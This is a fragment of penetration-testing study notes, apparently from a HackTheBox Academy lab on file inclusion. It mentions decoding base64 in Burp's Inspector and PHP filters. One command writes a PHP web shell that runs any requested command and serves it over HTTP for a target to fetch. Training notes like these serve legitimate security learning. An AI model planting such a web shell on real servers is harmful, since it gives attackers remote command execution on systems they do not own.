...
We can select the base64 string, click on Burp's Inspector tab (on the right pane), and it will show us the decoded file. For more on PHP filters, you can refer to the [File Inclusion / Directory Traversal](https://enterprise.hackthebox.com/academy-lab/2593/preview/modules/23) module.
...
mylesnieman@htb[/htb]`$ echo '<?php system($_REQUEST["cmd"]);?>' > shell.php $ sudo python3 -m http.server 80`
...
![[Pasted image 20240530100239.png]]